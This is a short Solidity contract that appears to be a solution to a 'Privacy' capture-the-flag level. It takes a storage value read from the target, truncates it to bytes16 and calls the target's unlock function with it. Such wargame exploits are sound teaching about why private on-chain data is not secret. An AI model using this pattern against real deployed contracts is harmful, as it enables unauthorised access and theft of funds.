//SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import './Privacy.sol';

contract PrivacyAttack {
    Privacy public target;

    constructor(address _targetAddr) public {
        target = Privacy(_targetAddr);
    }

    function unlock(bytes32 _data) public {
        bytes16 key = bytes16(_data);
        target.unlock(key);
    }
}

